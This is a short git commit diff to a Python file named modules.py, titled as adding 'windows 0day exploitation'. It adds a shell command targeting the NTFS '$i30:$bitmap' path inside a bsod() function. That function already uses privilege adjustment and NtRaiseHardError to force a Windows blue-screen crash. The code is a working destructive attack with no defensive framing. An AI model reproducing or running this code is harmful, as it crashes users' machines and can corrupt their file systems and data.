46e63d88b9fef6ddcdacf0883ea4d93c2467c197
restanse <67417142+restanse@users.noreply.github.com>
2021-01-16 12:06:07 +0300

    Update modules.py
    added windows 0day exploitation

--- modules.py
+++ modules.py
@@ -8,6 +8,7 @@ import subprocess
 import ctypes.wintypes
 
 def bsod():
+	subprocess.call("cd C:\:$i30:$bitmap",shell=True)
 	ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
 	ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, ctypes.byref(ctypes.wintypes.DWORD()))
 
